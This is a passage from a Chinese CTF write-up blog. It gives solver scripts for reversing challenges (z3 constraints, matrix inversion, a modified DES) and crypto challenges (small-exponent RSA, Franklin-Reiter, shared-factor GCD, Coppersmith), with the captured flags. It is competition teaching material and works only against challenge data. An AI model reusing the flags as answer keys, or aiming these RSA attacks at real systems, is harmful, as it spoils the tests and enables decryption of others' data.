class="line">    ((((((<span class="number">97</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + -<span class="number">9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + -<span class="number">2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>]) + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] == <span class="number">777044</span>,</span><br><span class="line">    (((((<span class="number">177</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">699</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">64</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + -<span class="number">9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + -<span class="number">2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>]) + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">28</span> * i11i1Iii1I1[<span class="number">28</span>] == <span class="number">185016</span>,</span><br><span class="line">    ((((((<span class="number">77</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">96</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">707</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + -<span class="number">9</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] + -<span class="number">2</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">222</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">224</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">26</span> * i11i1Iii1I1[<span class="number">25</span>] - -<span class="number">58</span> * i11i1Iii1I1[<span class="number">26</span>]) + <span class="number">27</span> * i11i1Iii1I1[<span class="number">27</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">28</span>]) + <span class="number">29</span> * i11i1Iii1I1[<span class="number">29</span>] == <span class="number">130106</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ii1iIi1i11i:</span><br><span class="line">    s.add(i)</span><br><span class="line"></span><br><span class="line">res =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        res += <span class="built_in">chr</span>(s.model()[i11i1Iii1I1[i]].as_long())</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">tab = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(res),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> res[i+<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">    tab[res[i+<span class="number">1</span>]] = res[i]</span><br><span class="line"><span class="built_in">print</span>(tab)</span><br><span class="line"></span><br><span class="line">m = <span class="string">&quot;111111116257645365477364777645752361&quot;</span></span><br><span class="line">flag = <span class="string">&quot;HZNUCTF&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">    flag += tab[i]</span><br><span class="line">flag+=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HZNUCTF&#123;ad7fa-76a7-ff6a-fffa-7f7d6a&#125;</span><br></pre></td></tr></table></figure>
<h3 id="水果忍者">水果忍者</h3>
<p>AES加密</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/02511bbf-892c-45d6-b19b-47ed2f1f2c55.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/7df6282c-0e31-4160-b0fa-ba697f1a6481.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/b91f85ed-1183-455c-9e1a-6d0c51834d1f.png"
                        alt=""
                 ></p>
<h3 id="randomsystem"><strong>randomsystem</strong></h3>
<p>大概逻辑就是矩阵操作，动调拿到密钥和盒解密一下。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">xor=[[<span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>], </span><br><span class="line">    [<span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>]]</span><br><span class="line">pw=[[<span class="number">0x00000178</span>, <span class="number">0x00000164</span>, <span class="number">0x000000A9</span>, <span class="number">0x000001F5</span>, <span class="number">0x00000115</span>, <span class="number">0x00000149</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000156</span>], </span><br><span class="line">    [<span class="number">0x0000017C</span>, <span class="number">0x0000016D</span>, <span class="number">0x000000A2</span>, <span class="number">0x00000102</span>, <span class="number">0x0000017D</span>, <span class="number">0x00000153</span>, <span class="number">0x0000015B</span>, <span class="number">0x00000133</span>], </span><br><span class="line">    [<span class="number">0x00000107</span>, <span class="number">0x00000167</span>, <span class="number">0x000000A2</span>, <span class="number">0x000001E4</span>, <span class="number">0x00000136</span>, <span class="number">0x0000014D</span>, <span class="number">0x0000015A</span>, <span class="number">0x00000153</span>], </span><br><span class="line">    [<span class="number">0x00000096</span>, <span class="number">0x000000C2</span>, <span class="number">0x000000AF</span>, <span class="number">0x00000158</span>, <span class="number">0x0000009E</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000080</span>, <span class="number">0x000000AF</span>], </span><br><span class="line">    [<span class="number">0x0000009E</span>, <span class="number">0x000000AD</span>, <span class="number">0x00000098</span>, <span class="number">0x0000017B</span>, <span class="number">0x0000009E</span>, <span class="number">0x00000124</span>, <span class="number">0x00000082</span>, <span class="number">0x0000016D</span>], </span><br><span class="line">    [<span class="number">0x000000C5</span>, <span class="number">0x00000014</span>, <span class="number">0x000000C5</span>, <span class="number">0x000000A1</span>, <span class="number">0x000000C6</span>, <span class="number">0x0000000A</span>, <span class="number">0x000000CF</span>, <span class="number">0x000000F4</span>], </span><br><span class="line">    [<span class="number">0x000000CA</span>, <span class="number">0x0000000E</span>, <span class="number">0x000000CC</span>, <span class="number">0x000000B0</span>, <span class="number">0x000000C1</span>, <span class="number">0x000000FF</span>, <span class="number">0x00000023</span>, <span class="number">0x00000007</span>], </span><br><span class="line">    [<span class="number">0x0000009E</span>, <span class="number">0x000000B5</span>, <span class="number">0x00000091</span>, <span class="number">0x00000161</span>, <span class="number">0x00000099</span>, <span class="number">0x00000165</span>, <span class="number">0x000000F6</span>, <span class="number">0x00000097</span>]]</span><br><span class="line">key=<span class="string">&#x27;ReVeReSe&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">      pw[i][j]=pw[i][j]^<span class="built_in">ord</span>(key[j])</span><br><span class="line">    <span class="comment"># print(pw[i],end=&#x27;,&#x27;)</span></span><br><span class="line"></span><br><span class="line">B = np.array(xor)</span><br><span class="line">C = np.array(pw) </span><br><span class="line"><span class="comment"># print(C)</span></span><br><span class="line">B_inv = np.linalg.inv(B)</span><br><span class="line"><span class="comment"># print(B_inv)</span></span><br><span class="line">A = np.dot(B_inv,C)</span><br><span class="line"></span><br><span class="line">A_i=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">     A_i.append(<span class="built_in">int</span>(A[i][j]))</span><br><span class="line"><span class="comment"># print(A_i)</span></span><br><span class="line"></span><br><span class="line">table=[<span class="number">0x0000001B</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000019</span>, <span class="number">0x00000017</span>, <span class="number">0x0000001C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000A</span>, </span><br><span class="line">    <span class="number">0x00000014</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000F</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000012</span>, <span class="number">0x00000013</span>, <span class="number">0x00000015</span>, </span><br><span class="line">    <span class="number">0x00000009</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000016</span>, <span class="number">0x00000018</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000003</span>, </span><br><span class="line">    <span class="number">0x0000000C</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000011</span>, <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">   A_i[i],A_i[<span class="number">63</span>-table[i]]=A_i[<span class="number">63</span>-table[i]],A_i[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">chr</span>(A_i[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58</span></span><br></pre></td></tr></table></figure>
<h3 id="exchange"><strong>exchange</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image.png"
                        alt="image"
                 ></p>
<p>魔改des，神秘表，0改1，1改0，推出逆表，再把密文patch回去出原文</p>
<p>333936147332632923d96353321d3345636826d26314621d3349330463126348</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">w_flag=<span class="string">&#x27;333936147332632923d96353321d3345636826d26314621d3349330463126348&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(w_flag),<span class="number">4</span>):</span><br><span class="line">    flag+=w_flag[i+<span class="number">0</span>]</span><br><span class="line">    flag+=w_flag[i+<span class="number">2</span>]</span><br><span class="line">    flag+=w_flag[i+<span class="number">1</span>]</span><br><span class="line">    flag+=w_flag[i+<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(flag))</span><br><span class="line"><span class="comment">#391ds2b9-9e31-45f8-ba4a-4904a2d8</span></span><br></pre></td></tr></table></figure>
<h2 id="Crypto：">Crypto：</h2>
<h3 id="宝宝RSA">宝宝RSA</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p1 = <span class="number">8362851990079664018649774360159786938757293294328116561219351503022492961843907118845919317399785168488103775809531198339213009936918460080250107807031483</span></span><br><span class="line">q1 = <span class="number">8312546034426788223492083178829355192676175323324230533451989649056072814335528263136523605276378801682321623998646291206494179416941978672637426346496531</span></span><br><span class="line">c1 = <span class="number">39711973075443303473292859404026809299317446021917391206568511014894789946819103680496756934914058521250438186214943037578346772475409633145435232816799913236259074769958139045997486622505579239448395807857034154142067866860431132262060279168752474990452298895511880964765819538256786616223902867436130100322</span></span><br><span class="line">n2 = <span class="number">103873139604388138367962901582343595570773101048733694603978570485894317088745160532049473181477976966240986994452119002966492405873949673076731730953232584747066494028393377311943117296014622567610739232596396108513639030323602579269952539931712136467116373246367352649143304819856986264023237676167338361059</span></span><br><span class="line">c2 = <span class="number">51380982170049779703682835988073709896409264083198805522051459033730166821511419536113492522308604225188048202917930917221</span></span><br><span class="line">e2 = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">phi1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> GCD(phi1,e) == <span class="number">1</span>:</span><br><span class="line">        d1 = invert(e,phi1)</span><br><span class="line">        m1 = <span class="built_in">pow</span>(c1,d1,p1*q1)</span><br><span class="line">        flag = long_to_bytes(m1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;TGCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = gmpy2.iroot(c2 + k * n2, e2)</span><br><span class="line">    <span class="keyword">if</span> res[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;TGCTF&#123;!!3xP_Is_Sm@ll_But_D@ng3r0&#125;&#x27;</span></span><br><span class="line"><span class="string">261713</span></span><br><span class="line"><span class="string">m@ll_But_D@ng3r0&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="费克特尔"><strong>费克特尔</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/29f00ffc-f588-4162-8d03-2d9641abd63f.png"
                        alt="" title=" =1531x969"
                 ></p>
<p>TGCTF{f4888_6abdc_9c2bd_9036bb}</p>
<h3 id="tRwSiAns"><strong>tRwSiAns</strong></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">n = <span class="number">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c1 = <span class="number">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span></span><br><span class="line">c2 = <span class="number">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(hashlib.md5(<span class="built_in">str</span>(x).encode()).hexdigest(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f1 = (x + <span class="built_in">hash</span>(<span class="number">307</span>))^e - c1</span><br><span class="line">    f2 = (x + <span class="built_in">hash</span>(<span class="number">7</span>))^e - c2</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">f1,f2</span>):</span><br><span class="line">        <span class="keyword">while</span> f2:</span><br><span class="line">            f1 , f2 = f2 , f1 % f2</span><br><span class="line">        <span class="keyword">return</span> f1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(f1,f2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">m=franklinReiter(n,e,c1,c2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># TGCTF&#123;RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="mm不躲猫猫"><strong>mm不躲猫猫</strong></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n_list = []</span><br><span class="line">c_list = []</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;challenge.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(lines):</span><br><span class="line">    line = lines[i].strip()</span><br><span class="line">    <span class="keyword">if</span> line.startswith(<span class="string">&#x27;n = &#x27;</span>):</span><br><span class="line">        n_value = <span class="built_in">int</span>(line.split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        c_line = lines[i + <span class="number">1</span>].strip()</span><br><span class="line">        <span class="keyword">if</span> c_line.startswith(<span class="string">&#x27;c = &#x27;</span>):</span><br><span class="line">            c_value = <span class="built_in">int</span>(c_line.split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            n_list.append(n_value)</span><br><span class="line">            c_list.append(c_value)</span><br><span class="line">            i += <span class="number">2</span>  <span class="comment"># 跳过已处理的两行</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Expected &#x27;c = &#x27; after &#x27;n = &#x27;, but got: <span class="subst">&#123;c_line&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n_list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n_list)):</span><br><span class="line">        p = GCD(n_list[i],n_list[j])</span><br><span class="line">    <span class="keyword">if</span> p != <span class="number">1</span> <span class="keyword">and</span> i != j <span class="keyword">and</span> isPrime(p):</span><br><span class="line">        <span class="built_in">print</span>(p)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;i = <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;j = <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">8966982846196321583218732818156212338929358106653027903288099594075033180211918114777730737751247653195936571427074856051307498770294940971178276714212171</span></span><br><span class="line">i = <span class="number">58</span></span><br><span class="line">j = <span class="number">59</span></span><br><span class="line"></span><br><span class="line">c = c_list[<span class="number">59</span>]</span><br><span class="line">d = gmpy2.invert(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># TGCTF&#123;ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="AAAAAAAA·真·签到"><strong>AAAAAAAA·真·签到</strong></h3>
<p>偏移量是1 0 -1 -2 -3……</p>
<p>根据偏移量移动flag，得到flag：TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}</p>
<h3 id="🇪🇿🇷🇸🇦"><strong>🇪🇿🇷🇸🇦</strong></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_root</span>(<span class="params">p,e,c</span>):</span><br><span class="line">    g=GCD(e, p-<span class="number">1</span>)</span><br><span class="line">    e=e//g</span><br><span class="line">    mg=<span class="built_in">pow</span>(c, inverse(e, p-<span class="number">1</span>),p)</span><br><span class="line">    R.&lt;x&gt;=Zmod(p)[]</span><br><span class="line">    f=x^g-mg</span><br><span class="line">    <span class="keyword">return</span> f.roots()</span><br><span class="line"></span><br><span class="line">p0 = <span class="string">&#x27;😘😾😂😋😶😾😳😷&#x27;</span></span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">c = <span class="number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(<span class="string">&#x27;😘&#x27;</span>.encode()))</span><br><span class="line">e = <span class="string">&quot;💯&quot;</span></span><br><span class="line">e=bytes_to_long(e.encode())</span><br><span class="line"><span class="keyword">for</span> pp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4036991100</span>,<span class="number">4036991100</span>+<span class="number">50</span>):</span><br><span class="line">    R.&lt;x&gt;=Zmod(n)[]</span><br><span class="line">    f=x*<span class="number">2</span>**<span class="number">288</span>+bytes_to_long(long_to_bytes(pp)+p0.encode())</span><br><span class="line">    f=f.monic()</span><br><span class="line">    roots=f.small_roots(X=<span class="number">2</span>^<span class="number">224</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        f=x*<span class="number">2</span>**<span class="number">288</span>+bytes_to_long(long_to_bytes(pp)+p0.encode())</span><br><span class="line">        p=<span class="built_in">int</span>(f(roots[<span class="number">0</span>]))</span><br><span class="line">        q=n//p</span><br><span class="line">        res1=find_root(p, e, c)</span><br><span class="line">        res2=find_root(q, e, c)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">                m=crt([<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>])],[p,q])</span><br><span class="line">                m=long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">                <span class="keyword">if</span> <span 